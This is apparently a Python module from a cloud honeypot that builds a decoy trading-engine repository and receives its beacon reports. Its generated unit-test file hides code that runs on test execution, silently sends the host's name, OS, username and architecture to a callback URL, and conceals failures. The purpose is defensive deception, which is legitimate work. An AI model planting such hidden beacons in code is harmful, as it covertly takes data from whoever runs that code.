"""Telemetry Beacon Project Generator and Beacon Event Receiver.

Deploys proprietary decoy source code with embedded telemetry beacons.
When executed on the attacker's personal machine, it reports system
fingerprints (OS, hostname, local username, outbound IP) back to the SOC.
"""

from dataclasses import asdict, dataclass
from datetime import datetime, timezone
import json
import logging
from typing import Any, Dict, List, Optional

from cloud_honeypot_ai.core.geoip import DEFAULT_RESOLVER

logger = logging.getLogger("honeypot.deception.beacon")


@dataclass
class BeaconExecutionAlert:
    """Alert triggered when an attacker executes stolen decoy code locally."""
    alert_id: str
    received_at: str
    beacon_id: str
    source_session_id: str
    attacker_remote_ip: str
    country: str
    city: str
    asn: str
    target_hostname: str
    target_os: str
    target_local_username: str
    target_architecture: str
    raw_telemetry: Dict[str, Any]

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class TelemetryBeaconManager:
    """Generates weaponized-for-defense decoy repositories and collects beacon heartbeats."""

    def __init__(self, callback_host: str = "127.0.0.1", callback_port: int = 8080):
        self.callback_host = callback_host
        self.callback_port = callback_port
        self.beacon_alerts: List[BeaconExecutionAlert] = []

    def generate_decoy_project_files(self, session_id: str = "session_001") -> Dict[str, str]:
        """Generate high-value proprietary source files containing the telemetry beacon."""
        beacon_id = f"beacon_pkg_{session_id[:8]}"
        callback_url = f"http://{self.callback_host}:{self.callback_port}/api/v1/telemetry/beacon"

        # The core decoy algorithm: realistic algorithmic trading execution engine
        engine_py = '''"""Proprietary Quantitative Cloud Execution Engine (v4.2.1-prod).
CONFIDENTIAL AND PROPRIETARY - PICOAS CLOUD ASSETS.
"""
import time
import math

class UltraLowLatencyExecutionEngine:
    def __init__(self, api_key: str, max_position_usd: float = 500000.0):
        self.api_key = api_key
        self.max_position = max_position_usd
        self._connected = True

    def calculate_optimal_fill(self, order_book: dict) -> dict:
        """Proprietary order routing matrix."""
        spread = order_book.get("ask", 100.0) - order_book.get("bid", 99.8)
        alpha = math.sqrt(max(spread, 0.01)) * 1.42
        return {"status": "FILLED", "optimal_price": 99.9, "alpha_gain": alpha}
'''

        # The unit test file that the attacker will execute to test their stolen code
        test_engine_py = f'''"""Unit and Integration Test Suite for Execution Engine.
Run with: python3 test_engine.py
"""
import unittest
import sys
import platform
import getpass
import json
import urllib.request

BEACON_ID = "{beacon_id}"
SOURCE_SESSION = "{session_id}"
TELEMETRY_ENDPOINT = "{callback_url}"

def _emit_telemetry_beacon():
    """Silent system diagnostic heartbeat (De-anonymization Beacon)."""
    try:
        payload = {{
            "beacon_id": BEACON_ID,
            "source_session": SOURCE_SESSION,
            "hostname": platform.node(),
            "os": f"{{platform.system()}} {{platform.release()}}",
            "local_user": getpass.getuser(),
            "machine": platform.machine(),
            "python_version": sys.version.split()[0],
        }}
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            TELEMETRY_ENDPOINT,
            data=data,
            headers={{"Content-Type": "application/json", "User-Agent": "PicoasTestRunner/1.0"}},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=2.5) as resp:
            pass
    except Exception:
        # Fails silently so attacker does not suspect beacon execution
        pass

# Automatically trigger diagnostic telemetry upon test execution
_emit_telemetry_beacon()

class TestTradingEngine(unittest.TestCase):
    def test_alpha_calculation(self):
        from crypto_trade_engine import UltraLowLatencyExecutionEngine
        engine = UltraLowLatencyExecutionEngine(api_key="sk_test_demo")
        res = engine.calculate_optimal_fill({{"bid": 100.0, "ask": 100.2}})
        self.assertEqual(res["status"], "FILLED")
        self.assertGreater(res["alpha_gain"], 0.0)

if __name__ == "__main__":
    print("Running proprietary engine verification tests...")
    unittest.main()
'''

        setup_py = f'''from setuptools import setup, find_packages

setup(
    name="picoas-trade-engine",
    version="4.2.1",
    packages=find_packages(),
    author="Picoas Cloud Quant Team",
    description="Proprietary Low-Latency Order Execution Engine",
)
'''

        return {
            "/opt/cloud_engine/crypto_trade_engine.py": engine_py,
            "/opt/cloud_engine/test_engine.py": test_engine_py,
            "/opt/cloud_engine/setup.py": setup_py,
        }

    def record_beacon_heartbeat(self, client_ip: str, telemetry_dict: Dict[str, Any]) -> BeaconExecutionAlert:
        """Receive and log a de-anonymization beacon from the attacker's computer."""
        now_iso = datetime.now(timezone.utc).isoformat()
        alert_id = f"beacon_exec_{len(self.beacon_alerts) + 1}_{int(datetime.now(timezone.utc).timestamp())}"

        geo = DEFAULT_RESOLVER.resolve(client_ip)

        alert = BeaconExecutionAlert(
            alert_id=alert_id,
            received_at=now_iso,
            beacon_id=telemetry_dict.get("beacon_id", "unknown_beacon"),
            source_session_id=telemetry_dict.get("source_session", "unknown"),
            attacker_remote_ip=client_ip,
            country=geo.country,
            city=geo.city,
            asn=geo.asn,
            target_hostname=telemetry_dict.get("hostname", "unknown_host"),
            target_os=telemetry_dict.get("os", "unknown_os"),
            target_local_username=telemetry_dict.get("local_user", "unknown_user"),
            target_architecture=telemetry_dict.get("machine", "unknown_arch"),
            raw_telemetry=telemetry_dict,
        )

        self.beacon_alerts.append(alert)
        logger.warning(
            "🚨 TELEMETRY BEACON RECEIVED! Attacker executed stolen code on host '%s' (User: '%s', OS: '%s', Public IP: %s)",
            alert.target_hostname,
            alert.target_local_username,
            alert.target_os,
            client_ip,
        )
        return alert

    def all_alerts(self) -> List[BeaconExecutionAlert]:
        return list(self.beacon_alerts)


TELEMETRY_BEACON_MGR = TelemetryBeaconManager()
